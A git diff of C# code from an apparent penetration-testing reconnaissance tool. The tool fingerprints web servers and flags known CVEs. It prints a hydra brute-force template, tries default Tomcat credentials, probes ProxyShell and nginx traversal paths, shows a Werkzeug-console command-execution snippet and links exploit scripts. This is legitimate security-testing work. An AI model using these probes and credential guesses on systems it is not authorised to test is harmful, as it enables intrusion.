@@ -1,7 +1,5 @@
-﻿using Pastel;
-using System;
+﻿using System;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
@@ -166,8 +164,8 @@ namespace Reecon
                         // This will only work in the best of cases
                         if ((inputs.Count == 3 || (inputs.Count == 2 && submitButtons.Count == 1)) && username != null && password != null)
                         {
-                            returnText += "-- " + "Possible Login Form Found".Pastel(Color.Orange) + Environment.NewLine;
-                            returnText += "--- " + $"hydra -l logins.txt -p passwords.txt 127.0.0.1 http-form-post \"/folder/post.php:{username}=^USER^&{password}=^PASS^:Invalid password error here\"".Pastel(Color.Orange) + Environment.NewLine;
+                            returnText += "-- " + "Possible Login Form Found".Recolor(Color.Orange) + Environment.NewLine;
+                            returnText += "--- " + $"hydra -l logins.txt -p passwords.txt 127.0.0.1 http-form-post \"/folder/post.php:{username}=^USER^&{password}=^PASS^:Invalid password error here\"".Recolor(Color.Orange) + Environment.NewLine;
                         }
                     }
                 }
@@ -375,6 +373,7 @@ namespace Reecon
                 "backup/",
                 "backups/",
                 "dev/",
+                "development/", 
                 // Common Index files
                 "index.php",
                 "index.html",
@@ -404,6 +403,8 @@ namespace Reecon
                 ".bash_history",
                 // NodeJS Environment File
                 ".env",
+                // PHP Composer configuration file
+                "composer.json",
                 // General info file
                 ".DS_STORE",
                 // Wordpress stuff
@@ -465,7 +466,7 @@ namespace Reecon
                             pageText.Length != ignoreFileLength &&
                             (!file.EndsWith("/") || (pageText.Length != ignoreFolderLength)))
                         {
-                            returnText += "- " + $"Common Path is readable: {url}{file} (Len: {pageText.Length})".Pastel(Color.Orange) + Environment.NewLine;
+                            returnText += "- " + $"Common Path is readable: {url}{file} (Len: {pageText.Length})".Recolor(Color.Orange) + Environment.NewLine;
                             // Specific case for robots.txt since it's common and extra useful
                             if (file == "robots.txt")
                             {
@@ -480,7 +481,7 @@ namespace Reecon
                             // Bolt
                             else if (file == "bolt-public/img/bolt-logo.png")
                             {
-                                returnText += "-- Bolt CMS!".Pastel(Color.Orange) + Environment.NewLine;
+                                returnText += "-- Bolt CMS!".Recolor(Color.Orange) + Environment.NewLine;
                                 returnText += $"-- Admin Page: {url}bolt" + Environment.NewLine;
                                 returnText += "-- If you get details and the version is 3.6.* or 3.7: https://www.rapid7.com/db/modules/exploit/unix/webapp/bolt_authenticated_rce OR https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py/blob/master/exploit.py (3.7.0)" + Environment.NewLine;
                             }
@@ -488,7 +489,7 @@ namespace Reecon
                             else if (file == "version" && pageText.Contains("Docker Engine - Community"))
                             {
                                 // Port 2375
-                                returnText += "-- Docker Engine Found!".Pastel(Color.Orange) + Environment.NewLine;
+                                returnText += "-- Docker Engine Found!".Recolor(Color.Orange) + Environment.NewLine;
                                 string dockerURL = url.Replace("https://", "tcp://").Replace("http://", "tcp://").Trim('/');
                                 returnText += $"--- List running Dockers: docker -H {dockerURL} ps" + Environment.NewLine;
                                 returnText += $"--- List Docker Images: docker -H {dockerURL} images" + Environment.NewLine;
@@ -566,7 +567,7 @@ namespace Reecon
                             // Directory listing
                             else if (response.PageTitle.StartsWith("Index of /"))
                             {
-                                returnText += "-- " + "Open directory listing".Pastel(Color.Orange) + Environment.NewLine;
+                                returnText += "-- " + "Open directory listing".Recolor(Color.Orange) + Environment.NewLine;
 
                                 // nginx Alias Traversal
                                 if (!nginxAliasTraversalChecked)
@@ -577,8 +578,8 @@ namespace Reecon
                                         var traversalResponse = Web.GetHTTPInfo(traversalPath);
                                         if (traversalResponse.PageTitle.Contains("Index of "))
                                         {
-                                            returnText += "--- " + "nginx Alias Traversal!!!".Pastel(Color.Orange) + Environment.NewLine;
-                                            returnText += "--- " + traversalPath.Pastel(Color.Orange) + Environment.NewLine;
+                                            returnText += "--- " + "nginx Alias Traversal!!!".Recolor(Color.Orange) + Environment.NewLine;
+                                            returnText += "--- " + traversalPath.Recolor(Color.Orange) + Environment.NewLine;
                                         }
                                     }
                                     nginxAliasTraversalChecked = true;
@@ -650,7 +651,7 @@ namespace Reecon
                 }
                 else if (response.StatusCode == 0)
                 {
-                    returnText += $"- " + "Host timed out - Unable to enumerate".Pastel(Color.Red);
+                    returnText += $"- " + "Host timed out - Unable to enumerate".Recolor(Color.Red);
                     break;
                 }
                 else if (response.StatusCode == HttpStatusCode.InternalServerError)
@@ -658,7 +659,7 @@ namespace Reecon
                     returnText += $"- Common path throws an Internal Server Error: {url}{file}" + Environment.NewLine;
                     if (file == "functionRouter")
                     {
-                        returnText += "-- " + "An Internal Server Error on functionRouter indicates that it's probably a Java Spring app - You should investigate this!".Pastel(Color.Orange) + Environment.NewLine;
+                        returnText += "-- " + "An Internal Server Error on functionRouter indicates that it's probably a Java Spring app - You should investigate this!".Recolor(Color.Orange) + Environment.NewLine;
                     }
                 }
                 else if (response.StatusCode == HttpStatusCode.TemporaryRedirect)
@@ -812,7 +813,7 @@ namespace Reecon
                 else if (ex.Message.StartsWith("The request was canceled due to the configured HttpClient.Timeout of "))
                 {
                     // Why is this not caught in the TimeoutException...
-                    Console.WriteLine($"- Odd TimeoutError - {url} timed out: {ex.Message} - Bug Reelix".Pastel(Color.Red));
+                    Console.WriteLine($"- Odd TimeoutError - {url} timed out: {ex.Message} - Bug Reelix".Recolor(Color.Red));
                     return (statusCode, null, null, null, null, null, url, "Timed Out :(");
                 }
                 else if (ex.InnerException != null && ex.InnerException.GetType().IsAssignableFrom(typeof(IOException)))
@@ -839,6 +840,8 @@ namespace Reecon
                         Console.WriteLine("Reecon.Web - Fatal Exception - Bug Reelix - SocketException: " + ex.InnerException.Message);
                     }
                 }
+                // An error occurred while sending the request.System.Net.Http.HttpIOException: The response ended prematurely. (ResponseEnded) ???
+                // Looks like I came across this before, but couldn't figure it out then either
                 else
                 {
                     Console.WriteLine("HttpClient rewrite had an error: " + ex.Message + ex.InnerException);
@@ -855,10 +858,10 @@ namespace Reecon
 
         public static string ParseHTTPInfo(HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders Headers, X509Certificate2 SSLCert, string URL)
         {
+            string toReturn = "";
             string urlPrefix = URL.StartsWith("https") ? "https" : "http";
             Uri theURI = new Uri(URL);
             string customPort = theURI.IsDefaultPort ? "" : ":" + theURI.Port.ToString();
-            string responseText = "";
             string baseURL = urlPrefix + "://" + DNS + customPort;
             string urlWithSlash = URL.EndsWith("/") ? URL : URL + "/";
 
@@ -870,8 +873,8 @@ namespace Reecon
                 {
                     if (Headers != null && Headers.Location != null)
                     {
-                        responseText += "- Moved Permanently" + Environment.NewLine;
-                        responseText += "-> Location: " + Headers.Location + Environment.NewLine;
+                        toReturn += "- Moved Permanently" + Environment.NewLine;
+                        toReturn += "-> Location: " + Headers.Location + Environment.NewLine;
                         Headers.Remove("Location");
                     }
                 }
@@ -879,8 +882,8 @@ namespace Reecon
                 {
                     if (Headers != null && Headers.Location != null)
                     {
-                        responseText += "- Redirect" + Environment.NewLine;
-                        responseText += "-> Location: " + Headers.Location + Environment.NewLine;
+                        toReturn += "- Redirect" + Environment.NewLine;
+                        toReturn += "-> Location: " + Headers.Location + Environment.NewLine;
 
                         // ProxyShell / ProxyLogin
                         // CVE-2021-26855
@@ -896,8 +899,8 @@ namespace Reecon
                             var proxyShellInfo = Web.GetHTTPInfo(URL.Trim('/') + "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com");
                             if (proxyShellInfo.StatusCode == HttpStatusCode.Redirect)
                             {
-                                responseText += "--> Possible Proxyshell / ProxyLogin!" + Environment.NewLine;
-                                responseText += "---> If you have an e-mail address, try: metasploit exploit/windows/http/exchange_proxyshell_rce" + Environment.NewLine;
+                                toReturn += "--> Possible Proxyshell / ProxyLogin!" + Environment.NewLine;
+                                toReturn += "---> If you have an e-mail address, try: metasploit exploit/windows/http/exchange_proxyshell_rce" + Environment.NewLine;
                             }
                             else
                             {
@@ -909,25 +912,25 @@ namespace Reecon
                 }
                 else if (StatusCode == HttpStatusCode.NotFound)
                 {
-                    responseText += "- Base page is a 404" + Environment.NewLine;
+                    toReturn += "- Base page is a 404" + Environment.NewLine;
                 }
                 else if (StatusCode == HttpStatusCode.Forbidden)
                 {
-                    responseText += "- Base page is Forbidden" + Environment.NewLine;
+                    toReturn += "- Base page is Forbidden" + Environment.NewLine;
                 }
                 else if (StatusCode != HttpStatusCode.OK)
                 {
                     try
                     {
-                        responseText += "- Weird Status Code: " + (int)StatusCode + " " + StatusCode + Environment.NewLine;
+                        toReturn += "- Weird Status Code: " + (int)StatusCode + " " + StatusCode + Environment.NewLine;
                     }
                     catch
                     {
-                        responseText += "- Fatally Unknown Status Code: " + " " + StatusCode + Environment.NewLine;
+                        toReturn += "- Fatally Unknown Status Code: " + " " + StatusCode + Environment.NewLine;
                     }
                     if (Headers != null && Headers.Location != null)
                     {
-                        responseText += "-> Location: " + Headers.Location + Environment.NewLine;
+                        toReturn += "-> Location: " + Headers.Location + Environment.NewLine;
                         Headers.Remove("Location");
                     }
                 }
@@ -937,7 +940,7 @@ namespace Reecon
             if (!string.IsNullOrEmpty(PageTitle))
             {
                 PageTitle = PageTitle.Trim();
-                responseText += "- Page Title: " + PageTitle + Environment.NewLine;
+                toReturn += "- Page Title: " + PageTitle + Environment.NewLine;
 
                 // Apache Tomcat
                 if (PageTitle.StartsWith("Apache Tomcat"))
@@ -956,9 +959,11 @@ namespace Reecon
                         Apache Tomcat 8.5.0 to 8.5.39
                         Apache Tomcat 7.0.0 to 7.0.93
                     */
+                    // https://nvd.nist.gov/vuln/detail/CVE-2017-7675
+                    // In Apache Tomcat 9.0.0.M1 to 9.0.0.M21 and 8.5.0 to 8.5.15
                     if (PageTitle == "Apache Tomcat/9.0.17")
                     {
-                        responseText += "- " + "Apache Tomcat 9.0.17 Detected - Vulnerable to CVE-2019-0232!".Pastel(Color.Orange);
+                        toReturn += "- " + "Apache Tomcat 9.0.17 Detected - Vulnerable to CVE-2019-0232!".Recolor(Color.Orange);
                     }
 
                     // Apache Tomcat Page
@@ -972,52 +977,53 @@ namespace Reecon
                     ];
 
                     List<string> tomcatLoginPages = new List<string>();
-                    string managerStatusURL = URL + "manager/status"; // Manager (Status)
+                    string managerStatusURL = URL + "manager/status,Manager (Status)"; // Manager (Status)
                     tomcatLoginPages.Add(managerStatusURL);
-                    string managerAppHTMLURL = URL + "manager/html"; // Manager App (HTML)
+                    string managerAppHTMLURL = URL + "manager/html,Manager App (HTML)"; // Manager App (HTML)
                     tomcatLoginPages.Add(managerAppHTMLURL);
-                    string managerAppTextURL = URL + "manager/text"; // Manager App (Text)
+                    string managerAppTextURL = URL + "manager/text,Manager App (Text)"; // Manager App (Text)
                     tomcatLoginPages.Add(managerAppTextURL);
-                    string hostManagerURL = URL + "host-manager/html"; // Host Manager (HTML)
+                    string hostManagerURL = URL + "host-manager/html,Host Manager (HTML)"; // Host Manager (HTML)
                     tomcatLoginPages.Add(hostManagerURL);
 
                     foreach (string tomcatLoginPage in tomcatLoginPages)
                     {
-                        string friendlyName = "";
+                        string loginPage = tomcatLoginPage.Split(',')[0];
+                        string friendlyName = tomcatLoginPage.Split(',')[1];
                         var pageInfo = Web.GetHTTPInfo(tomcatLoginPage);
                         if (pageInfo.StatusCode == HttpStatusCode.Unauthorized)
                         {
-                            responseText += "- Yadda Found - But it requires credentials --> " + tomcatLoginPage + Environment.NewLine;
+                            toReturn += $"- {friendlyName} - But it requires credentials --> {loginPage}" + Environment.NewLine;
                             try
                             {
                                 // NetworkCredential defaultTomcatCreds = new("tomcat", "s3cret");
                                 bool found = false;
                                 foreach (var creds in defaultTomcatCreds)
                                 {
-                                    if (DownloadString(tomcatLoginPage, Creds: creds).StatusCode != HttpStatusCode.Unauthorized)
+                                    if (DownloadString(loginPage, Creds: creds).StatusCode != HttpStatusCode.Unauthorized)
                                     {
                                         found = true;
-                                        responseText += "-- " + $"Creds Found: {creds.UserName}:{creds.Password}".Pastel(Color.Orange) + Environment.NewLine;
+                                        toReturn += "-- " + $"Creds Found: {creds.UserName}:{creds.Password}".Recolor(Color.Orange) + Environment.NewLine;
                                         break;
                                     }
                                 }
                                 if (!found)
                                 {
-                                    responseText += "-- No Creds found - You can try more over at: /auxiliary/scanner/http/tomcat_mgr_login" + Environment.NewLine;
+                                    toReturn += "-- No Creds found - You can try more over at: /auxiliary/scanner/http/tomcat_mgr_login" + Environment.NewLine;
                                 }
                             }
                             catch
                             {
-                                responseText += "-- Default creds - tomcat:s3cret - don't work" + Environment.NewLine;
+                                toReturn += "-- Default creds - tomcat:s3cret - don't work" + Environment.NewLine;
                             }
                         }
                         else if (pageInfo.StatusCode == HttpStatusCode.Forbidden)
                         {
-                            responseText += "- Manager App Found - But it's Forbidden" + Environment.NewLine;
+                            toReturn += $"- {friendlyName} Found - But it's Forbidden" + Environment.NewLine;
                         }
                         else if (pageInfo.StatusCode != HttpStatusCode.NotFound)
                         {
-                            responseText += "Unknown Manager App Status Code: " + pageInfo.StatusCode + Environment.NewLine;
+                            toReturn += $"- Unknown {friendlyName} Status Code: " + pageInfo.StatusCode + Environment.NewLine;
                         }
                     }
                 }
@@ -1026,7 +1032,7 @@ namespace Reecon
             // DNS
             if (!string.IsNullOrEmpty(DNS))
             {
-                responseText += "- DNS: " + DNS + Environment.NewLine;
+                toReturn += "- DNS: " + DNS + Environment.NewLine;
             }
 
             // Headers + Cookies!
@@ -1039,61 +1045,83 @@ namespace Reecon
                     Headers.Remove("Server");
                     // Eg: Apache/2.4.46, (Win64), OpenSSL/1.1.1j, PHP/7.3.27
                     // Heartbleed - OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable
-                    responseText += "- Server: " + serverText + Environment.NewLine;
+                    toReturn += "- Server: " + serverText + Environment.NewLine;
+
+                    // Apache
                     if (serverText.StartsWith("Apache"))
                     {
-                        responseText += "-- " + "Apache Detected".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "-- " + "Apache Detected".Recolor(Color.Orange) + Environment.NewLine;
                         if (serverText.Contains("2.4.49") || serverText.Contains("2.4.50"))
                         {
-                            responseText += "--- " + "Version possible vulnerable to CVE-2021-41773 or CVE-2021-42013" + Environment.NewLine;
+                            toReturn += "--- " + "Version possible vulnerable to CVE-2021-41773 or CVE-2021-42013" + Environment.NewLine;
                             // TODO: Add better sources
                         }
                     }
+
+                    else if (serverText.StartsWith("ATS/"))
+                    {
+                        toReturn += "-- ATS (Apache Traffic Server) Detected!" + Environment.NewLine;
+                        string version = serverText.Remove(0, 4);
+                        if (version == "7.1.1")
+                        {
+                            toReturn += "--- Vulnerable to CVE-2018–8004 - Request Smuggling - Oof :<" + Environment.NewLine;
+                        }
+                        else
+                        {
+                            toReturn += "-- If version versions 6.0.0 to 6.2.2 and 7.0.0 to 7.1.3. -> CVE-2018–8004 (Request Smuggling) - Oof :<" + Environment.NewLine;
+                            toReturn += "-- If you see this, bug Reelix to fix the ATS version check" + Environment.NewLine;
+                        }
+                    }
+                    // CouchDB
                     else if (serverText.StartsWith("CouchDB/"))
                     {
-                        responseText += "-- CouchDB Detected!" + Environment.NewLine;
+                        toReturn += "-- CouchDB Detected!" + Environment.NewLine;
                         var utilsPage = GetHTTPInfo($"{urlWithSlash}_utils/");
                         if (utilsPage.StatusCode == HttpStatusCode.OK || utilsPage.StatusCode == HttpStatusCode.NotModified)
                         {
-                            responseText += "--- " + $"Web Admin Tool Found: {utilsPage.URL}".Pastel(Color.Orange) + Environment.NewLine;
+                            toReturn += "--- " + $"Web Admin Tool Found: {utilsPage.URL}".Recolor(Color.Orange) + Environment.NewLine;
                         }
                         var allDBsPage = GetHTTPInfo($"{urlWithSlash}_all_dbs");
                         if (allDBsPage.StatusCode == HttpStatusCode.OK)
                         {
                             string allDBsPageText = allDBsPage.PageText.Trim(Environment.NewLine.ToCharArray());
-                            responseText += "--- " + $"All DBs Found ( {allDBsPage.URL} ) : {allDBsPageText}".Pastel(Color.Orange) + Environment.NewLine;
-                            responseText += $"--- Enumeration: {urlWithSlash}dbNameHere/_all_docs" + Environment.NewLine;
+                            toReturn += "--- " + $"All DBs Found ( {allDBsPage.URL} ) : {allDBsPageText}".Recolor(Color.Orange) + Environment.NewLine;
+                            toReturn += $"--- Enumeration: {urlWithSlash}dbNameHere/_all_docs" + Environment.NewLine;
                             // ID or Key Name? They both seem to be the same in test scnearios...
-                            responseText += $"--- Enumeration: {urlWithSlash}dbNameHere/idHere" + Environment.NewLine;
+                            toReturn += $"--- Enumeration: {urlWithSlash}dbNameHere/idHere" + Environment.NewLine;
                         }
                     }
+
+                    // HFS
                     else if (serverText.StartsWith("HFS"))
                     {
-                        responseText += "-- HTTP File Server (HFS) Detected!" + Environment.NewLine;
+                        toReturn += "-- HTTP File Server (HFS) Detected!" + Environment.NewLine;
                         if (serverText.Contains("HFS 2.3"))
                         {
-                            responseText += "--- " + "Version likely vulnerable to CVE-2014-6287 - https://www.exploit-db.com/raw/49584".Pastel(Color.Orange) + Environment.NewLine;
+                            toReturn += "--- " + "Version likely vulnerable to CVE-2014-6287 - https://www.exploit-db.com/raw/49584".Recolor(Color.Orange) + Environment.NewLine;
                         }
                     }
+
+                    // lighttpd
                     else if (serverText.StartsWith("lighttpd"))
                     {
-                        responseText += "-- " + "lighttpd Detected" + Environment.NewLine;
-                        responseText += "-- If version is below 1.4.19, check https://www.exploit-db.com/exploits/31396 (CVE-2008-1270)" + Environment.NewLine;
+                        toReturn += "-- " + "lighttpd Detected" + Environment.NewLine;
+                        toReturn += "-- If version is below 1.4.19, check https://www.exploit-db.com/exploits/31396 (CVE-2008-1270)" + Environment.NewLine;
                     }
                     else if (serverText.StartsWith("MiniServ/"))
                     {
-                        responseText += "-- " + "Webmin Server Detected".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "-- " + "Webmin Server Detected".Recolor(Color.Orange) + Environment.NewLine;
                         if (serverText == "MiniServ/1.580")
                         {
-                            responseText += "--- " + "Version Likely vulnerable to CVE-2012-2982!!".Pastel(Color.Orange) + Environment.NewLine;
-                            responseText += "---- https://www.exploit-db.com/exploits/21851 (Metasploit)" + Environment.NewLine;
-                            responseText += "---- OR https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py" + Environment.NewLine;
+                            toReturn += "--- " + "Version Likely vulnerable to CVE-2012-2982!!".Recolor(Color.Orange) + Environment.NewLine;
+                            toReturn += "---- https://www.exploit-db.com/exploits/21851 (Metasploit)" + Environment.NewLine;
+                            toReturn += "---- OR https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py" + Environment.NewLine;
                         }
                         // 1.890, 1.900-1.920 - http://www.webmin.com/changes.html
                         else if (serverText.StartsWith("MiniServ/1.890") || serverText.StartsWith("MiniServ/1.900") || serverText.StartsWith("MiniServ/1.910") || serverText.StartsWith("MiniServ/1.920"))
                         {
-                            responseText += "--- " + "Version Likely vulnerable to CVE-2019-15107!!".Pastel(Color.Orange) + Environment.NewLine;
-                            responseText += "---- git clone https://github.com/MuirlandOracle/CVE-2019-15107 OR https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin_backdoor.rb" + Environment.NewLine;
+                            toReturn += "--- " + "Version Likely vulnerable to CVE-2019-15107!!".Recolor(Color.Orange) + Environment.NewLine;
+                            toReturn += "---- git clone https://github.com/MuirlandOracle/CVE-2019-15107 OR https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin_backdoor.rb" + Environment.NewLine;
                         }
                         // https://www.cybersecurity-help.cz/vdb/SB2019030801
                         // -> Webmin: 0.1 - 1.900
@@ -1107,25 +1135,25 @@ namespace Reecon
                     }
                     else if (serverText.StartsWith("Werkzeug/"))
                     {
-                        responseText += "-- " + "Werkzeug Detected" + Environment.NewLine;
+                        toReturn += "-- " + "Werkzeug Detected" + Environment.NewLine;
                         var consolePage = GetHTTPInfo($"{urlWithSlash}console");
                         if (consolePage.StatusCode != HttpStatusCode.NotFound)
                         {
                             if (consolePage.PageText.Contains("The console is locked and needs to be unlocked by entering the PIN."))
                             {
-                                responseText += "--- /console exists - But it needs a PIN" + Environment.NewLine;
-                                responseText += "--- If you get LFI - https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug" + Environment.NewLine;
+                                toReturn += "--- /console exists - But it needs a PIN" + Environment.NewLine;
+                                toReturn += "--- If you get LFI - https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug" + Environment.NewLine;
                             }
                             else
                             {
-                                responseText += "--- /console exists - With no PIN!".Pastel(Color.Orange) + Environment.NewLine;
+                                toReturn += "--- /console exists - With no PIN!".Recolor(Color.Orange) + Environment.NewLine;
                                 // import os; print(os.popen("whoami").read())
                                 // __import__('os').popen('whoami').read();
                             }
                         }
                         else
                         {
-                            responseText += "--- No /console :(" + Environment.NewLine;
+                            toReturn += "--- No /console :(" + Environment.NewLine;
                         }
                     }
                 }
@@ -1135,18 +1163,18 @@ namespace Reecon
                 {
                     string generator = Headers.GetValues("X-Generator").First();
                     Headers.Remove("X-Powered-By");
-                    responseText += "- X-Generator: " + generator + Environment.NewLine;
+                    toReturn += "- X-Generator: " + generator + Environment.NewLine;
 
                     if (generator.StartsWith("Drupal"))
                     {
-                        responseText += "-- Drupal Detected" + Environment.NewLine;
+                        toReturn += "-- Drupal Detected" + Environment.NewLine;
                         // TODO: Do these in-code
-                        responseText += $"-- Possible Version Detection: curl -s {baseURL}/CHANGELOG.txt | grep -m2 \"\"" + Environment.NewLine;
+                        toReturn += $"-- Possible Version Detection: curl -s {baseURL}/CHANGELOG.txt | grep -m2 \"\"" + Environment.NewLine;
                         // Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1
                         // Drupalgeddon - https://nvd.nist.gov/vuln/detail/cve-2018-7600
-                        responseText += $"-- Possible Version Detection 2: curl -s {baseURL}/ grep 'content=\"Drupal'" + Environment.NewLine;
-                        responseText += $"-- Content Discovery: {baseURL}/node/1 (2,3,4,etc.)" + Environment.NewLine;
-                        responseText += $"--- Run: droopescan scan drupal -u {baseURL}/ (pipx install droopescan)" + Environment.NewLine;
+                        toReturn += $"-- Possible Version Detection 2: curl -s {baseURL}/ grep 'content=\"Drupal'" + Environment.NewLine;
+                        toReturn += $"-- Content Discovery: {baseURL}/node/1 (2,3,4,etc.)" + Environment.NewLine;
+                        toReturn += $"--- Run: droopescan scan drupal -u {baseURL}/ (pipx install droopescan)" + Environment.NewLine;
                     }
                 }
 
@@ -1154,25 +1182,25 @@ namespace Reecon
                 {
                     string poweredBy = Headers.GetValues("X-Powered-By").First();
                     Headers.Remove("X-Powered-By");
-                    responseText += "- X-Powered-By: " + poweredBy + Environment.NewLine;
+                    toReturn += "- X-Powered-By: " + poweredBy + Environment.NewLine;
 
                     if (poweredBy.Contains("PHP"))
                     {
-                        responseText += "-- PHP Detected" + Environment.NewLine;
+                        toReturn += "-- PHP Detected" + Environment.NewLine;
                         if (poweredBy.Contains("/8.1.0-dev"))
                         {
-                            responseText += "--- " + "Vulnerable PHP Version (PHP/8.1.0-dev) Detected - https://www.exploit-db.com/raw/49933 <-----".Pastel(Color.Orange) + Environment.NewLine;
+                            toReturn += "--- " + "Vulnerable PHP Version (PHP/8.1.0-dev) Detected - https://www.exploit-db.com/raw/49933 <-----".Recolor(Color.Orange) + Environment.NewLine;
                         }
                     }
                     // JBoss
                     if (poweredBy.Contains("JBoss"))
                     {
-                        responseText += "-- " + "JBoss Detected - Run jexboss - https://github.com/joaomatosf/jexboss <-----".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "-- " + "JBoss Detected - Run jexboss - https://github.com/joaomatosf/jexboss <-----".Recolor(Color.Orange) + Environment.NewLine;
                     }
                     // Strapi
                     else if (poweredBy == "Strapi <strapi.io>")
                     {
-                        responseText += "-- " + "Strapi detected".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "-- " + "Strapi detected".Recolor(Color.Orange) + Environment.NewLine;
                         var versionCheck = Web.GetHTTPInfo($"{URL.Trim('/')}/admin/init");
                         if (versionCheck.StatusCode == HttpStatusCode.OK)
                         {
@@ -1181,25 +1209,25 @@ namespace Reecon
                             {
                                 var versionData = JsonDocument.Parse(versionJson);
                                 string versionText = versionData.RootElement.GetProperty("data").GetProperty("strapiVersion").GetString();
-                                responseText += "--- Version: " + versionText + Environment.NewLine;
+                                toReturn += "--- Version: " + versionText + Environment.NewLine;
                                 if (versionText == "3.0.0-beta.17.4")
                                 {
                                     // CVE-2019-18818, CVE-2019-19609
-                                    responseText += "---- " + "Vulnerable Version Detected (Unauthenticated RCE!) - Run https://www.exploit-db.com/exploits/50239".Pastel(Color.Orange) + Environment.NewLine;
+                                    toReturn += "---- " + "Vulnerable Version Detected (Unauthenticated RCE!) - Run https://www.exploit-db.com/exploits/50239".Recolor(Color.Orange) + Environment.NewLine;
                                 }
                                 else if (versionText == "3.0.0-beta.17.7")
                                 {
                                     // CVE-2019-19609 (Auth'd)
-                                    responseText += "----" + "Vulnerable Version Detected (Authenticated RCE) - https://www.exploit-db.com/exploits/50238".Pastel(Color.Orange) + Environment.NewLine;
+                                    toReturn += "----" + "Vulnerable Version Detected (Authenticated RCE) - https://www.exploit-db.com/exploits/50238".Recolor(Color.Orange) + Environment.NewLine;
                                 }
                                 else
                                 {
-                                    responseText += "---- Vulnerable if before 3.0.0-beta.17.8 - Bug Reelix!" + Environment.NewLine;
+                                    toReturn += "---- Vulnerable if before 3.0.0-beta.17.8 - Bug Reelix!" + Environment.NewLine;
                                 }
                             }
                             catch (Exception ex)
                             {
-                                responseText += "--- Error - Version isn't formatted correctly: " + ex.Message + Environment.NewLine;
+                                toReturn += "--- Error - Version isn't formatted correctly: " + ex.Message + Environment.NewLine;
                             }
                         }
                     }
@@ -1208,70 +1236,90 @@ namespace Reecon
                 // Confluence
                 if (Headers.Any(x => x.Key == "X-Confluence-Request-Time"))
                 {
-                    responseText += "-- " + "Confluence Detected".Pastel(Color.Orange) + Environment.NewLine;
-                    responseText += "--- Bug Reelix - https://nvd.nist.gov/vuln/detail/CVE-2023-22527";
+                    toReturn += "-- " + "Confluence Detected".Recolor(Color.Orange) + Environment.NewLine;
+                    toReturn += "--- Bug Reelix - https://nvd.nist.gov/vuln/detail/CVE-2023-22527";
+                }
+
+                // Elasticsearch
+                if (Headers.Any(x => x.Key == "X-Found-Handling-Cluster") && Headers.Any(x => x.Key == "X-Found-Handling-Instance"))
+                {
+                    toReturn += "-- " + "Elasticsearch Detected".Recolor(Color.Orange) + Environment.NewLine;
+
+                    // We could get the cluster / instance name if we really wanted, but no need really
+                    Headers.Remove("X-Found-Handling-Cluster");
+                    Headers.Remove("X-Found-Handling-Instance");
                 }
 
                 // Gitlab
                 if (Headers.Any(x => x.Key == "X-Gitlab-Meta"))
                 {
-                    responseText += "-- " + "Gitlab Detected".Pastel(Color.Orange) + Environment.NewLine;
+                    toReturn += "-- " + "Gitlab Detected".Recolor(Color.Orange) + Environment.NewLine;
                     var versionCheck = GetHTTPInfo($"{URL}assets/webpack/manifest.json");
                     if (versionCheck.StatusCode == HttpStatusCode.OK)
                     {
                         JsonDocument versionData = JsonDocument.Parse(versionCheck.PageText);
                         string hash = versionData.RootElement.GetProperty("hash").GetString();
-                        responseText += "-- " + $"Version Hash: {hash}".Pastel(Color.Orange) + Environment.NewLine;
-                        responseText += "-- " + "Search in: https://raw.githubusercontent.com/righel/gitlab-version-nse/main/gitlab_hashes.json".Pastel(Color.Orange) + Environment.NewLine;
-                        responseText += "--- " + "CVE-2021-22205: 11.9.0 to 13.8.7, 13.9.0 to 13.9.5, 13.10.0 to 13.10.2 (Inclusive)".Pastel(Color.Orange) + Environment.NewLine;
-                        responseText += "--- " + "CVE-2023-7028: 16.1 to 16.1.5, 16.2 to 16.2.8, 16.3 to 16.3.6, 16.4 to 16.4.4, 16.5 to 16.5.5, 16.6 to 16.6.3, 16.7 to 16.7.1 (Inclusive)".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "-- " + $"Version Hash: {hash}".Recolor(Color.Orange) + Environment.NewLine;
+                        toReturn += "-- " + "Search in: https://raw.githubusercontent.com/righel/gitlab-version-nse/main/gitlab_hashes.json".Recolor(Color.Orange) + Environment.NewLine;
+                        toReturn += "--- " + "CVE-2021-22205: 11.9.0 to 13.8.7, 13.9.0 to 13.9.5, 13.10.0 to 13.10.2 (Inclusive)".Recolor(Color.Orange) + Environment.NewLine;
+                        toReturn += "--- " + "CVE-2023-7028: 16.1 to 16.1.5, 16.2 to 16.2.8, 16.3 to 16.3.6, 16.4 to 16.4.4, 16.5 to 16.5.5, 16.6 to 16.6.3, 16.7 to 16.7.1 (Inclusive)".Recolor(Color.Orange) + Environment.NewLine;
                     }
                 }
 
                 // Influxdb
                 if (Headers.Any(x => x.Key.StartsWith("X-Influxdb-Version")))
                 {
+                    toReturn += "- InfluxDB Detected".Recolor(Color.Orange) + Environment.NewLine;
                     string influxDBVersion = Headers.GetValues("X-Influxdb-Version").First();
                     Headers.Remove("X-Influxdb-Version");
-                    responseText += "- InfluxDB Detected - Version: " + influxDBVersion + Environment.NewLine;
+                    toReturn += "- InfluxDB Detected - Version: " + influxDBVersion + Environment.NewLine;
                     Version theVersion = new Version(influxDBVersion);
                     if (theVersion <= new Version("1.3.0"))
                     {
-                        responseText += "-- " + "Possible Vulnerable Version Detected - https://www.komodosec.com/post/when-all-else-fails-find-a-0-day <-----".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "-- " + "Possible Vulnerable Version Detected - https://www.komodosec.com/post/when-all-else-fails-find-a-0-day <-----".Recolor(Color.Orange) + Environment.NewLine;
                     }
                 }
 
